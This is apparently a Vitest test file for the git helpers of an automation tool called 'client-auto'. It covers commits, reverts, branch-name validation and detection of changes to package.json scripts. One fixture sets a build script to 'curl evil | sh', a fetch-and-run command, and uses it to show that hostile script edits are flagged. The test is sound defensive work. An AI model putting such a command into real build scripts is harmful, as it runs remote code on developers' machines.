import { describe, it, expect } from 'vitest';
import fs from 'node:fs';
import path from 'node:path';
import { isClean, ensureBranch, discardChanges, commitAll, push, revertLast, changedPaths, scriptsChanged } from '../src/git.js';
import { makeRepo, git, remoteSubject } from './helpers.js';

describe('git helpers', () => {
  it('isClean ignores .client-auto but sees real edits', async () => {
    const { dir } = makeRepo();
    fs.mkdirSync(path.join(dir, '.client-auto'));
    fs.writeFileSync(path.join(dir, '.client-auto', 'log.md'), 'secret client text');
    expect(await isClean(dir)).toBe(true);
    fs.writeFileSync(path.join(dir, 'index.html'), 'changed');
    expect(await isClean(dir)).toBe(false);
  });

  it('commitAll never stages .client-auto and returns null when nothing changed', async () => {
    const { dir } = makeRepo();
    fs.mkdirSync(path.join(dir, '.client-auto'));
    fs.writeFileSync(path.join(dir, '.client-auto', 'log.md'), 'secret client text');
    expect(await commitAll(dir, 'client-auto: nothing')).toBeNull();
    fs.writeFileSync(path.join(dir, 'new.html'), 'x');
    const sha = await commitAll(dir, 'client-auto: add page');
    expect(sha).toMatch(/^[0-9a-f]{40}$/);
    expect(git(dir, 'ls-files')).not.toContain('.client-auto');
  });

  it('commitAll works when .client-auto/ is git-excluded (as after connect)', async () => {
    const { dir } = makeRepo();
    fs.appendFileSync(path.join(dir, '.git', 'info', 'exclude'), '.client-auto/\n');
    fs.mkdirSync(path.join(dir, '.client-auto'));
    fs.writeFileSync(path.join(dir, '.client-auto', 'log.md'), 'secret client text');
    fs.writeFileSync(path.join(dir, 'new.html'), 'x');
    expect(await commitAll(dir, 'client-auto: add page')).toMatch(/^[0-9a-f]{40}$/);
    expect(git(dir, 'ls-files')).not.toContain('.client-auto');
  });

  it('push sends the commit to the remote', async () => {
    const { dir, remote } = makeRepo();
    fs.writeFileSync(path.join(dir, 'a.txt'), 'a');
    await commitAll(dir, 'client-auto: a');
    await push(dir);
    expect(remoteSubject(remote)).toBe('client-auto: a');
  });

  it('ensureBranch rejects a branch starting with a dash', async () => {
    const { dir } = makeRepo();
    await expect(ensureBranch(dir, '-f')).rejects.toThrow(/invalid branch/i);
  });
  it('ensureBranch creates and reuses a branch; null leaves HEAD alone', async () => {
    const { dir } = makeRepo();
    await ensureBranch(dir, null);
    expect(git(dir, 'rev-parse', '--abbrev-ref', 'HEAD')).toBe('main');
    await ensureBranch(dir, 'client-changes');
    expect(git(dir, 'rev-parse', '--abbrev-ref', 'HEAD')).toBe('client-changes');
    await ensureBranch(dir, 'client-changes');
    expect(git(dir, 'rev-parse', '--abbrev-ref', 'HEAD')).toBe('client-changes');
  });

  it('discardChanges restores tracked files and removes untracked ones but keeps .client-auto', async () => {
    const { dir } = makeRepo();
    fs.mkdirSync(path.join(dir, '.client-auto'));
    fs.writeFileSync(path.join(dir, '.client-auto', 'log.md'), 'keep');
    fs.writeFileSync(path.join(dir, 'index.html'), 'broken');
    fs.writeFileSync(path.join(dir, 'junk.txt'), 'junk');
    await discardChanges(dir);
    expect(fs.readFileSync(path.join(dir, 'index.html'), 'utf8')).toBe('<h1>Hello</h1>\n');
    expect(fs.existsSync(path.join(dir, 'junk.txt'))).toBe(false);
    expect(fs.existsSync(path.join(dir, '.client-auto', 'log.md'))).toBe(true);
  });

  it('revertLast reverts client-auto commits newest first, each only once', async () => {
    const { dir } = makeRepo();
    fs.writeFileSync(path.join(dir, 'one.txt'), '1');
    const first = await commitAll(dir, 'client-auto: one');
    fs.writeFileSync(path.join(dir, 'two.txt'), '2');
    const second = await commitAll(dir, 'client-auto: two');
    expect(await revertLast(dir)).toBe(second);
    expect(fs.existsSync(path.join(dir, 'two.txt'))).toBe(false);
    expect(await revertLast(dir)).toBe(first);
    expect(fs.existsSync(path.join(dir, 'one.txt'))).toBe(false);
    expect(await revertLast(dir)).toBeNull();
  });

  it('revertLast aborts a conflicting revert and leaves the repo clean', async () => {
    const { dir } = makeRepo();
    fs.writeFileSync(path.join(dir, 'f.txt'), 'one\n');
    await commitAll(dir, 'client-auto: one');
    fs.writeFileSync(path.join(dir, 'f.txt'), 'two\n');
    git(dir, 'add', '-A');
    git(dir, 'commit', '-m', 'edit later');
    await expect(revertLast(dir)).rejects.toThrow();
    expect(await isClean(dir)).toBe(true);
    expect(fs.existsSync(path.join(dir, '.git', 'REVERT_HEAD'))).toBe(false);
  });

  it('changedPaths lists modified, deleted, untracked (-uall) and odd file names, excluding .client-auto', async () => {
    const { dir } = makeRepo();
    expect(await changedPaths(dir)).toEqual([]);
    fs.mkdirSync(path.join(dir, '.client-auto'));
    fs.writeFileSync(path.join(dir, '.client-auto', 'log.md'), 'x');
    fs.writeFileSync(path.join(dir, 'index.html'), 'changed');
    fs.writeFileSync(path.join(dir, 'my page.html'), 'x');
    fs.mkdirSync(path.join(dir, '.github', 'workflows'), { recursive: true });
    fs.writeFileSync(path.join(dir, '.github', 'workflows', 'x.yml'), 'x');
    fs.writeFileSync(path.join(dir, 'caf\u00e9 \u00fc.txt'), 'x');
    expect((await changedPaths(dir)).sort()).toEqual(
      ['.github/workflows/x.yml', 'caf\u00e9 \u00fc.txt', 'index.html', 'my page.html'].sort(),
    );
  });

  it('changedPaths reports a renamed file under both its old and new name', async () => {
    const { dir } = makeRepo();
    fs.mkdirSync(path.join(dir, '.github'));
    fs.writeFileSync(path.join(dir, '.github', 'ci.yml'), 'name: ci\n');
    git(dir, 'add', '-A'); git(dir, 'commit', '-m', 'ci');
    git(dir, 'mv', '.github/ci.yml', 'ci.yml');
    expect((await changedPaths(dir)).sort()).toEqual(['.github/ci.yml', 'ci.yml']);
  });

  it('scriptsChanged compares the package.json scripts field with HEAD', async () => {
    const { dir } = makeRepo();
    const pkg = path.join(dir, 'package.json');
    expect(await scriptsChanged(dir)).toBe(false); // no package.json anywhere
    fs.writeFileSync(pkg, JSON.stringify({ name: 'x' }));
    expect(await scriptsChanged(dir)).toBe(false); // new, but no scripts
    fs.writeFileSync(pkg, JSON.stringify({ name: 'x', scripts: { build: 'echo hi' } }));
    expect(await scriptsChanged(dir)).toBe(true); // new with scripts
    git(dir, 'add', '-A'); git(dir, 'commit', '-m', 'pkg');
    expect(await scriptsChanged(dir)).toBe(false);
    fs.writeFileSync(pkg, JSON.stringify({ scripts: { build: 'echo hi' }, name: 'x', dependencies: { a: '1' } }));
    expect(await scriptsChanged(dir)).toBe(false); // other fields and key order do not matter
    fs.writeFileSync(pkg, JSON.stringify({ name: 'x', scripts: { build: 'curl evil | sh' } }));
    expect(await scriptsChanged(dir)).toBe(true);
    fs.writeFileSync(pkg, JSON.stringify({ name: 'x', scripts: { build: 'echo hi', postinstall: 'x' } }));
    expect(await scriptsChanged(dir)).toBe(true);
    fs.writeFileSync(pkg, '{ not json');
    expect(await scriptsChanged(dir)).toBe(true);
    fs.rmSync(pkg);
    expect(await scriptsChanged(dir)).toBe(true); // scripts removed
  });
});
